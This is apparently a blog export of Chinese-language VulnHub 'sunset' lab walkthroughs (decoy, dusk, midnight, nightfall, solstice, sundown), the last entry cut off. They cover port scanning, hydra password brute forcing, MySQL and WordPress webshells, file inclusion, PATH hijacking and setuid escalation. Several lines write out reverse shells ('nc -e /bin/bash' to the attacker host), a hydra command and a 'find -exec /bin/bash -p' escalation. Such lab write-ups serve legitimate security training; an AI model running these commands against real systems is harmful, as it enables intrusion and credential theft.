class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &lt;= <span class="number">8</span> )</span><br><span class="line">    JUMPOUT(__CS__, (<span class="keyword">char</span> *)dword_22C4 + dword_22C4[v11]);</span><br><span class="line">  v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;No available option was selected. Ending program.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> lines();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行的命令们</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000212A command         db &#39;&#x2F;usr&#x2F;bin&#x2F;date&#39;,0    ; DATA XREF: intro(void)+234↑o</span><br><span class="line">.rodata:0000000000002138 ; char aUsrBinCal[]</span><br><span class="line">.rodata:0000000000002138 aUsrBinCal      db &#39;&#x2F;usr&#x2F;bin&#x2F;cal&#39;,0     ; DATA XREF: intro(void)+245↑o</span><br><span class="line">.rodata:0000000000002145                 align 8</span><br><span class="line">.rodata:0000000000002148 aShutdownIsCurr db &#39;Shutdown is currently not available due to not enough privileges.&#39;</span><br><span class="line">.rodata:0000000000002148                                         ; DATA XREF: intro(void)+256↑o</span><br><span class="line">.rodata:0000000000002148                 db &#39; Ending program.&#39;,0</span><br><span class="line">.rodata:000000000000219A                 align 20h</span><br><span class="line">.rodata:00000000000021A0 aRebootingIsCur db &#39;Rebooting is currently not available due to not enough privileges&#39;</span><br><span class="line">.rodata:00000000000021A0                                         ; DATA XREF: intro(void)+283↑o</span><br><span class="line">.rodata:00000000000021A0                 db &#39;. Ending program.&#39;,0</span><br><span class="line">.rodata:00000000000021F3                 align 8</span><br><span class="line">.rodata:00000000000021F8 ; char aUsrBinTouchDev[]</span><br><span class="line">.rodata:00000000000021F8 aUsrBinTouchDev db &#39;&#x2F;usr&#x2F;bin&#x2F;touch &#x2F;dev&#x2F;shm&#x2F;STTY5246&#39;,0</span><br><span class="line">.rodata:00000000000021F8                                         ; DATA XREF: intro(void)+2AD↑o</span><br><span class="line">.rodata:0000000000002219                 align 20h</span><br><span class="line">.rodata:0000000000002220 aTheAvScanWillB db &#39;The AV Scan will be launched in a minute or less.&#39;,0</span><br><span class="line">.rodata:0000000000002220                                         ; DATA XREF: intro(void)+2B9↑o</span><br><span class="line">.rodata:0000000000002252 ; char aUsrBinCatEtcPa[]</span><br><span class="line">.rodata:0000000000002252 aUsrBinCatEtcPa db &#39;&#x2F;usr&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd&#39;,0</span><br><span class="line">.rodata:0000000000002252                                         ; DATA XREF: intro(void)+2E3↑o</span><br><span class="line">.rodata:000000000000226B                 align 10h</span><br><span class="line">.rodata:0000000000002270 ; char aUsrBinViTmpCmf[]</span><br><span class="line">.rodata:0000000000002270 aUsrBinViTmpCmf db &#39;&#x2F;usr&#x2F;bin&#x2F;vi &#x2F;tmp&#x2F;cmFuZG9tc2Zvc2FuZm9kYW52cw&#x3D;&#x3D;&#39;,0</span><br><span class="line">.rodata:0000000000002270                                         ; DATA XREF: intro(void)+2F1↑o</span><br><span class="line">.rodata:000000000000229E                 align 20h</span><br><span class="line">.rodata:00000000000022A0 ; char aUsrSbinService[]</span><br><span class="line">.rodata:00000000000022A0 aUsrSbinService db &#39;&#x2F;usr&#x2F;sbin&#x2F;service apache2 status&#39;,0</span><br><span class="line">.rodata:00000000000022A0                                         ; DATA XREF: intro(void)+2FF↑o</span><br></pre></td></tr></table></figure>

<p>得到了大致的流程</p>
<p>只有<code>5</code>比较可疑了</p>
<p>运行之后结果</p>
<img src="sunset:decoy/image-20200711001348249.png" alt="image-20200711001348249" style="zoom: 25%;" />

<p>使用<code>pspy64</code>工具查看日志</p>
<img src="sunset:decoy/image-20200711001425793.png" alt="image-20200711001425793" style="zoom:25%;" />

<p>在后面看到了这个</p>
<p>用<code>searchsploit</code>查找一下脚本</p>
<img src="sunset:decoy/image-20200711001507490.png" alt="image-20200711001507490" style="zoom:33%;" />

<p>看一下内容</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Steps to reproduce:</span><br><span class="line"></span><br><span class="line">- Put an executable file named &#x27;update&#x27; with non-root owner in /tmp (not</span><br><span class="line">mounted noexec, obviously)</span><br><span class="line">- Run chkrootkit (as uid 0)</span><br></pre></td></tr></table></figure>

<p>在<code>/tmp</code>目录下新建一个<code>update</code>文件（可执行的）即可</p>
<img src="sunset:decoy/image-20200711001648434.png" alt="image-20200711001648434" style="zoom:33%;" />

<p>写入一个反弹shell</p>
<p>并且给执行权限</p>
<img src="sunset:decoy/image-20200711001728284.png" alt="image-20200711001728284" style="zoom:33%;" />

<p>本地监听，运行</p>
<img src="sunset:decoy/image-20200711001746820.png" alt="image-20200711001746820" style="zoom:33%;" />

]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>enum</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:dusk靶机</title>
    <url>//sunset-dusk.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
<p>简单难度</p>
<a id="more"></a>

<h1 id="sunset-dusk"><a href="#sunset-dusk" class="headerlink" title="sunset:dusk"></a>sunset:dusk</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>  靶机：<code>192.168.2.2</code></li>
<li>  攻击机： <code>192.168.2.3</code></li>
</ul>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标靶机开放了<code>21, 22, 25, 80, 3306, 8080</code>端口</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204102852598.png" alt="image-20201204102852598"></p>
<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问<code>80</code>端口，是<code>apache</code>的默认页面</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103005406.png" alt="image-20201204103005406">爆破一下目录</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103131440.png" alt="image-20201204103131440"></p>
<p>啥也没有，看来入口点不是这儿</p>
<h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>还有一个8080端口，访问一下，发现列出了目录内容和目录路径</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103504978.png" alt="image-20201204103504978"></p>
<p>应该是在这个地方写webshell了</p>
<p>但是又没有能够写的地方。</p>
<h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>尝试一下sql密码的爆破</p>
<p>结果啪的一下就爆出来了，很快啊</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103642826.png" alt="image-20201204103642826"></p>
<p>连上去</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103716762.png" alt="image-20201204103716762"></p>
<p>看一下能否写文件，</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103759529.png" alt="image-20201204103759529"></p>
<p>发现<code>secure_file_priv</code>这一栏为空，代表任何目录都可以写。那就写入一个webshell</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103943177.png" alt="image-20201204103943177"></p>
<p>访问<code>http://192.168.2.2:8080/1.php</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104014665.png" alt="image-20201204104014665"></p>
<p>拿一个反弹shell</p>
<p><code>http://192.168.2.2:8080/1.php?cmd=nc -e /bin/bash 192.168.2.3 8848</code></p>
<p>在本机监听端口<code>nc -vlp 8848</code></p>
<p>接收到一个反弹shell，并使用pty模块</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104215760.png" alt="image-20201204104215760"></p>
<p>至此，写入了webshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找一下具有<code>setuid</code>权限的程序</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104326786.png" alt="image-20201204104326786"></p>
<p>没啥能用的</p>
<p><code>sudo -l</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104349290.png" alt="image-20201204104349290"></p>
<p><code>make</code>是可以提权的。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104432893.png" alt="image-20201204104432893"></p>
<p>照着做，提权到<code>dusk</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104625718.png" alt="image-20201204104625718"></p>
<p>直接写入<code>.ssh/authorized_keys</code></p>
<p>使用ssh登录</p>
<p>然后就断了，翻找了一下，发现<code>docker</code>能够提权</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104755286.png" alt="image-20201204104755286"></p>
<p>尝试一下</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104814575.png" alt="image-20201204104814575"></p>
<p>啊这？</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105143223.png" alt="image-20201204105143223"></p>
<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在尝试提权的过程中，我试着用<code>ps -auxwww</code>命令，查看了一下历史进程</p>
<p>发现了<code>root</code>运行的<code>ftp</code>的用户名和密码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104935220.png" alt="image-20201204104935220"></p>
<p>然后ftp登录上去</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105020833.png" alt="image-20201204105020833"></p>
<p>路径是<code>/root</code>，下面的<code>root.txt</code>就是最终的flag，可以get下来。。。</p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>enum</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:midnight靶机</title>
    <url>//sunset-midnight.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset-midnight 靶机</p>
<p>简单难度</p>
<a id="more"></a>

<h1 id="sunset-midnight"><a href="#sunset-midnight" class="headerlink" title="sunset:midnight"></a>sunset:midnight</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>  靶机：<code>192.168.2.4</code></li>
<li>  攻击机：<code>192.168.2.3</code></li>
</ul>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标开放<code>22 80 3306</code>端口</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201123005.png" alt="image-20201208201123005"></p>
<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><p>上来先各种爆破密码</p>
<p>用<code>hydra</code>爆破<code>ssh</code>和<code>sql</code></p>
<p>同时访问web，看到是一个<code>wordpress</code></p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>用<code>wpscan</code>扫描一下，有没有现成的洞</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201359830.png" alt="image-20201208201359830"></p>
<p>结果是没有，扫描出来一个用户是<code>admin</code></p>
<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>此时<code>hydra</code>爆破的结果出来了</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201509729.png" alt="image-20201208201509729"></p>
<p>连接上去，试图写webshell，看一下写文件权限</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201554509.png" alt="image-20201208201554509"></p>
<p>发现没有限制写的目录，试图写入<code>/var/www/html/info.php</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201651841.png" alt="image-20201208201651841"></p>
<p>没有写这个目录的权限…..</p>
<p>又想到这是<code>wordpress</code>站点，密码是存在数据库里的，只要能够修改数据库，那就能进到后台</p>
<p>其中stdout数据库是我自己在测试的时候新建的</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201758315.png" alt="image-20201208201758315"></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201836930.png" alt="image-20201208201836930"></p>
<p>密码就放在<code>wp_users</code>表中</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208201916092.png" alt="image-20201208201916092"></p>
<p>用<code>update</code>语句修改<code>admin</code>的密码即可（密码记得用md5）</p>
<p>于是可以进入<code>wordpress</code>后台</p>
<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>既然进了后台，那就好办多了</p>
<p>编辑<code>Appearance -&gt; Theme Editor</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202100504.png" alt="image-20201208202100504"></p>
<p>可以直接修改php源码</p>
<p>但是有个问题，不能直接修改正在使用的主题的php源码</p>
<p>否则会报错</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202204736.png" alt="image-20201208202204736"></p>
<p>既然如此就改掉别的主题的代码</p>
<p>修改完之后切换主题过去</p>
<p>得到一个webshell</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202247739.png" alt="image-20201208202247739"></p>
<p>连接一个反弹shell <code>nc -e /bin/bash 192.168.2.3 8848</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202407486.png" alt="image-20201208202407486"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找一下<code>setuid</code>权限的文件</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202501668.png" alt="image-20201208202501668"></p>
<p>这个<code>status</code>也是老朋友了，下载下来反编译一下</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202538533.png" alt="image-20201208202538533"></p>
<p>调用了<code>service</code>命令，直接劫持<code>PATH</code></p>
<p>劫持到<code>/tmp</code>目录下，写入一个<code>service</code>文件，并给可执行权限</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202701534.png" alt="image-20201208202701534"></p>
<p>调用<code>status</code>就可以得到root权限</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202724394.png" alt="image-20201208202724394"></p>
<p><code>/root</code>目录下面有个flag</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202751435.png" alt="image-20201208202751435"></p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:nightfall靶机</title>
    <url>//sunset-nightfall.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset:solstice 靶机</p>
<p>简单难度</p>
<a id="more"></a>



<h1 id="sunset-nightfall"><a href="#sunset-nightfall" class="headerlink" title="sunset:nightfall"></a>sunset:nightfall</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>  靶机：<code>172.16.224.7</code></li>
<li>  攻击机： <code>172.16.224.2</code></li>
</ul>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100609327.png" alt="image-20201202100609327"></p>
<p>目标开放 <strong>21, 22, 80, 3306</strong>端口</p>
<p>下面的smb扫描结果，看到目标靶机可以使用<code>guest</code>用户登陆</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100700298.png" alt="image-20201202100700298"></p>
<h2 id="smb-login"><a href="#smb-login" class="headerlink" title="smb login"></a>smb login</h2><p>使用<code>smbclient -L 172.16.224.7 -U guest%</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100756052.png" alt="image-20201202100756052"></p>
<p>遍历其中没有发现任何有用的东西</p>
<h2 id="ftp-enum"><a href="#ftp-enum" class="headerlink" title="ftp enum"></a>ftp enum</h2><p>目标转换为爆破<code>ftp/ssh</code>，但是爆破必须要有密码，<code>root</code>用户的密码肯定爆破不了</p>
<p>用<code>enum4linux</code>工具获得用户名</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100949238.png" alt="image-20201202100949238"></p>
<p>把这两个用户写入到<code>user.txt</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101026630.png" alt="image-20201202101026630"></p>
<p>使用<code>hydra</code>爆破目标用户的密码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101056208.png" alt="image-20201202101056208"></p>
<p><code>hydra -L user.txt -P /usr/share/wordlist/rockyou.txt -I -v ftp(/ssh)://172.16.224.7</code></p>
<p>结果爆破出ftp的密码<strong>为<code>cheese</code></strong></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101135455.png" alt="image-20201202101135455"></p>
<p>尝试直接用这个密码ssh登陆，可惜失败了</p>
<p>只能登陆ftp</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101333781.png" alt="image-20201202101333781"></p>
<p>这个路径显然是<code>~/</code>，可以把自己的ssh密钥写入<code>.ssh/authorized_keys</code>，达到免密登陆的效果。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>免密登陆ssh之后，权限只是一个<code>matt</code>，目标肯定是得到root权限，所以肯定要去提权</p>
<p>寻找一下免密运行的程序和有<code>setuid</code>权限的程序</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101730129.png" alt="image-20201202101730129"></p>
<p>找到一个<code>find</code>，看一下<code>help</code>（skr</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101806880.png" alt="image-20201202101806880"></p>
<p>也可以通过一个网站</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101836182.png" alt="image-20201202101836182"></p>
<p>对于有<code>setuid</code>权限的<code>find</code>程序，使用<code>find . -exec /bin/bash -p \; -quit</code>可以提权</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101947347.png" alt="image-20201202101947347"></p>
<p>要注意的是默认的<code>find</code>不是<code>/script/find</code>，所以使用的时候需要使用绝对路径</p>
<p>切换到<code>nightfall</code>用户之后，写入他的<code>~/.ssh/authorized_keys</code>中，免密登陆</p>
<p>顺便继续看看能够免密运行的程序。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102126776.png" alt="image-20201202102126776"></p>
<p>发现<code>/usr/bin/cat</code>是可以使用<code>root</code>权限免密运行的，由于<code>cat</code>命令只能够读文件，并不能写入文件，所以无法通过这个直接提权</p>
<p>但是这使得攻击者可以读取任意文件，在<code>/etc/shadow</code>中存放了各个用户的密码的hash值，如果能够爆破出密码的话，也就起到了相关的作用</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102426797.png" alt="image-20201202102426797"></p>
<p>写入到<code>hash.txt</code>，使用<code>john</code>工具爆破</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102513857.png" alt="image-20201202102513857"></p>
<p>得到了root的密码为<code>miguel2</code></p>
<p>登录<code>root</code>账户，得到flag</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102608133.png" alt="image-20201202102608133"></p>
<p>字符画太大了，截图不太行（</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102645471.png" alt="image-20201202102645471"></p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:solstice靶机</title>
    <url>//sunset-solstice.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset:solstice 靶机</p>
<p>简单难度</p>
<a id="more"></a>



<h1 id="sunset-solstice"><a href="#sunset-solstice" class="headerlink" title="sunset:solstice"></a>sunset:solstice</h1><p>日常略过这俩步骤</p>
<img src="sunset:solstice/image-20200715143325755.png" alt="image-20200715143325755" style="zoom:33%;" />

<img src="sunset:solstice/image-20200715143339999.png" alt="image-20200715143339999" style="zoom:33%;" />



<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>访问80端口</p>
<img src="sunset:solstice/image-20200715143506650.png" alt="image-20200715143506650" style="zoom:33%;" />

<p>扫目录也啥都没用</p>
<p>看到上面还有http端口——8593，访问一下</p>
<img src="sunset:solstice/image-20200715143617550.png" alt="image-20200715143617550" style="zoom:33%;" />

<p>其中<code>Book List</code>存在文件包含漏洞</p>
<img src="sunset:solstice/image-20200715143649831.png" alt="image-20200715143649831" style="zoom:33%;" />

<p>一开始还以为是sql注入，发现并不是，是一个文件包含</p>
<img src="sunset:solstice/image-20200715143737245.png" alt="image-20200715143737245" style="zoom:25%;" />

<p>然后使用log文件包含，得到一个反弹shell</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><img src="sunset:solstice/image-20200715144055207.png" alt="image-20200715144055207" style="zoom:25%;" />

<p>然后再利用文件包含访问<code>access.log</code>就可以得到一个webshell</p>
<img src="sunset:solstice/image-20200715145103589.png" alt="image-20200715145103589" style="zoom:33%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看一下进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps -auxwww | grep &quot;root&quot;</span><br><span class="line"></span><br><span class="line">root       572  0.0  0.1   2388   340 ?        Ss   02:48   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br></pre></td></tr></table></figure>



<p>php -S——本地开启一个webserver</p>
<p>然后<code>/var/tmp/sv/</code>的权限</p>
<img src="sunset:solstice/image-20200715145421847.png" alt="image-20200715145421847" style="zoom:25%;" />

<p><code>index.php</code>是可写的，写入一个后门</p>
<img src="sunset:solstice/image-20200715145923712.png" alt="image-20200715145923712" style="zoom:25%;" />

<p>本地开启监听之后，使用curl命令访问</p>
<img src="sunset:solstice/image-20200715150007472.png" alt="image-20200715150007472" style="zoom:33%;" />

<p>得到root</p>
<img src="sunset:solstice/image-20200715150043954.png" alt="image-20200715150043954" style="zoom:25%;" />

]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>file-including</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:sundown靶机</title>
    <url>//sunset-sundown.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset:sundown 靶机</p>
<p>简单难度</p>
<a id="more"></a>

<h1 id="sunset-sundown"><a href="#sunset-sundown" class="headerlink" title="sunset:sundown"></a>sunset:sundown</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>  靶机: <code>192.168.2.6</code></li>
<li>  攻击机: <code>192.168.2.3</code></li>
</ul>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>目标靶机开放<code>22</code>,  <code>80</code>端口</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170252613.png" alt="image-20201211170252613"></p>
<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><p>访问<code>http://192.168.2.6</code>是一个<code>wordpress</code>页面</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170409505.png" alt="image-20201211170409505"></p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>使用<code>wpscan</code>扫描</p>
<ul>
<li><p>用户</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170516857.png" alt="image-20201211170516857"></p>
</li>
<li><p>主题</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170543382.png" alt="image-20201211170543382"></p>
</li>
<li><p>插件</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170650061.png" alt="image-20201211170650061"></p>
</li>
</ul>
<p>查找一下插件的漏洞</p>
<p>有一个文件包含</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170730586.png" alt="image-20201211170730586"></p>
<p>尝试一下</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170801116.png" alt="image-20201211170801116"></p>
<p>确实存在文件包含漏洞，尝试包含日志文件</p>
<p><code>url=/var/log/apache2/access.log</code>失败</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170840553.png" alt="image-20201211170840553"></p>
<p>猜想可能是将日志文件放到了其他的目录</p>
<p>尝试<code>php://input</code>伪协议进行RCE，失败</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170935508.png" alt="image-20201211170935508"></p>
<p>并不解析<code>phpinfo()</code></p>
<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>从上面的<code>/etc/passwd</code>可以看到有个用户名为carlos</p>
<p>爆破一下密码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171157482.png" alt="image-20201211171157482"></p>
<p>得到了密码<code>carlos</code></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>ssh登录<code>carlos</code></p>
<p>该用户不在<code>/etc/sudoers</code>中，不能免密执行一些程序</p>
<p>找一找<code>setuid</code>权限的程序，也没有什么特别的</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171318907.png" alt="image-20201211171318907"></p>
<p>看一下进程<code>ps -auxwww</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171427856.png" alt="image-20201211171427856"></p>
<p>发现<code>mysql</code>是以root权限运行的，可以尝试一下<a href="https://blog.csdn.net/qq_33020901/article/details/78827375">mysql提权</a>，首先从<code>/var/www/html/wordpress/wp-config.php</code>中读取数据库的密码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171622315.png" alt="image-20201211171622315"></p>
<p>登录mysql</p>
<p>仿照上面的超链接参考资料，写入<code>sys_eval</code>函数，用于执行系统命令</p>
<p>尝试写入<code>～/.ssh/authroized_keys</code>，成功写入，但是无法远程连接<code>root</code>（并非配置文件<code>/etc/ssh/sshd_config</code>的问题）</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171947574.png" alt="image-20201211171947574"></p>
<p>尝试写一个shell文件，并给予<code>setuid</code>权限，运行。失败，得到不到<code>root权限</code>，好像是由于<code>carlos</code>用户不在<code>root</code>组内</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172214709.png" alt="image-20201211172214709"></p>
<p>尝试直接反弹shell，失败</p>
<p>尝试写入<code>/etc/passwd</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172252987.png" alt="image-20201211172252987"></p>
<p>切换到该用户<code>su kali2</code>，得到root权限</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172325288.png" alt="image-20201211172325288"></p>
<p>得到flag(<code>/root/proot.txt</code>)</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172940994.png" alt="image-20201211172940994"></p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>之前被师傅面试的时候问到：</p>
<blockquote>
<p>  如果有这么一个场景：你拥有任意文件写，如何获取shell？</p>
</blockquote>
<p>我的回答是</p>
<blockquote>
<ol>
<li> 写定时文件(/etc/crontab)</li>
<li> 写~/.ssh/authorized_keys</li>
<li> 写~/.bashrc</li>
<li> 写自启动（开机自启后运行的程序）</li>
<li> 写/etc/passwd</li>
<li> 写一个具有setuid权限的程序</li>
</ol>
</blockquote>
<p>正确性有待考证。。。</p>
<p>然后又想了</p>
<blockquote>
<p>  劫持动态链接库是否可行？</p>
<p>  写入一些配置文件是否可行？</p>
</blockquote>
<p>有待思考。。。</p>
<h2 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h2><h3 id="2020-12-12"><a href="#2020-12-12" class="headerlink" title="2020.12.12"></a>2020.12.12</h3><ol>
<li><p>las师傅在我的建议下也做了一下这个靶机，在最后的一部分他反弹shell成功了</p>
